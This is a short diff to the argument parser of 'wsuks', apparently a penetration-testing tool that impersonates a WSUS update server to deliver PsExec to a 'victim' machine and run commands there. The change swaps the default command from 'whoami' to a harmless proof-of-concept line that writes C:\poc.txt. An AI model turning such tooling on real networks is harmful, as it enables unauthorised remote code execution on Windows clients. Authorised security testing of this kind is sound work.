@@ -38,7 +38,7 @@ def initParser():
     parser.add_argument('-t', '--target-ip', metavar='', dest='targetIp', help='IP Address of the victim Client. (REQUIRED)', required=True)
     parser.add_argument('-I', '--interface', metavar='', help='Network Interface to use. (DEFAULT: %(default)s)', default='eth0')
     parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe',type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
-    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='whoami')
+    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s cmd.exe /c “echo wsus.poc > C:\\poc.txt”')
 
     simple = parser.add_argument_group('AUTOMATIC MODE', 'Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)')
     simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with. (Required in automatic Mode)')
